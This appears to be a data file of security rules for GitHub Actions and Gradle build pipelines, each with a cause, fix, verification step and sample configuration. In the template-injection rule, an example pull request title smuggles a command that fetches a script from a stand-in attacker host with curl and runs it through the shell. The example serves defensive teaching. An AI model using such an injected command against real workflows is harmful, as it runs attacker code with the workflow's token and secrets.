rules.title: Third-party action is pinned to a tag or branch, not a commit SHA
rules.why: A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line.
rules.fix: Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current.
rules.verify: Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` should end in a 40-character SHA.

rules.title: Workflow token permissions are not restricted
rules.why: Every run gets a GITHUB_TOKEN. Without a `permissions:` block it gets the repository default, which is read-write on many older organizations, so any hijacked step can push code or change releases.
rules.fix: Add `permissions: {}` at the top of the workflow so the token can do nothing, then grant each job only what it needs. Never use `write-all`.
rules.verify: Open a run's "Set up job" log and check the GITHUB_TOKEN permissions list matches what the job needs.

fix_code.code:
permissions: {}          # workflow level: deny everything
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read     # job level: only what this job needs

rules.title: pull_request_target workflow checks out the pull request's code
rules.why: `pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack.
rules.fix: Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.
rules.verify: Search the workflow for `pull_request_target` and confirm no job in it checks out `github.event.pull_request.head.*` or runs `gh pr checkout`.

fix_code.code:
on:
  pull_request:          # fork code runs with a read-only token and no secrets

permissions: {}
jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          persist-credentials: false
      - run: ./gradlew assembleDebug

rules.title: Untrusted event text is pasted into a run script
rules.why: GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x"; curl evil | sh` then runs as your workflow, with its token and secrets.
rules.fix: Pass the value through `env:` and read it as a quoted shell variable, so it stays data.
rules.verify: Run zizmor (`template-injection` audit) or actionlint; no `run:` block should expand attacker-controlled fields (titles, bodies, branch names, commit messages, `github.head_ref`) directly.

fix_code.code:
# Wrong: a PR titled   x"; curl -s https://evil.example | sh; echo "   runs as your script
- run: echo "Checking ${{ github.event.pull_request.title }}"

# Right: pass it as data through the environment, and quote it
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Checking $PR_TITLE"

rules.title: actions/checkout leaves the job token on disk
rules.why: By default `actions/checkout` leaves the job token in the workspace's git config (from v6, in a credentials file under `$RUNNER_TEMP` that `.git/config` includes). Every later step, including third-party actions and build scripts, can read it, and with older versions an uploaded artifact of the workspace can leak it.
rules.fix: Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token, and it can pass it explicitly to that one command.
rules.verify: In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.

fix_code.code:
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false   # don't leave the token on disk for later steps

rules.title: Signing key or signing password is committed to the repository
rules.why: Anyone who can read the repository, or any of its forks and clones, can sign builds as you. Deleting the file later doesn't help: it stays in git history.
rules.fix: Rotate first: request an upload key reset in Play Console, or revoke the certificate or API key. Then remove the file from history, store the keystore base64-encoded in the CI secret store, decode it at build time, and read passwords from environment variables.
rules.verify: Run `git log --all -- '*.jks' '*.keystore' '*.p12' '*.p8' key.properties` and confirm nothing comes back after the history rewrite.

rules.title: Gradle wrapper download is not checked against a SHA-256
rules.why: Without `distributionSha256Sum`, the wrapper runs whatever Gradle distribution the download URL returns. A swapped distribution runs with full access to your build and its signing secrets.
rules.fix: Add `distributionSha256Sum` to `gradle/wrapper/gradle-wrapper.properties`, using the checksum published for that exact Gradle version. `./gradlew wrapper --gradle-version <v> --gradle-distribution-sha256-sum <sha>` writes it for you.
rules.verify: Change one character of the checksum and run `./gradlew help` on a clean machine: the download should fail verification.

fix_code.code:
# gradle/wrapper/gradle-wrapper.properties
distributionUrl=https\://services.gradle.org/distributions/gradle-<version>-bin.zip
distributionSha256Sum=<SHA-256 published at gradle.org/release-checksums for that file>

rules.title: No dependency lockfile is committed
rules.why: Without a lockfile, the same build file can resolve a different dependency version next month, including a malicious one, and nobody notices because no file changed.
rules.fix: Enable Gradle dependency locking and commit each module's `gradle.lockfile`. For Swift packages, commit `Package.resolved`. Libraries that others depend on may leave `Package.resolved` out on purpose.
rules.verify: Run `./gradlew dependencies --write-locks`, commit the result, and confirm a later build fails if a resolved version changes.
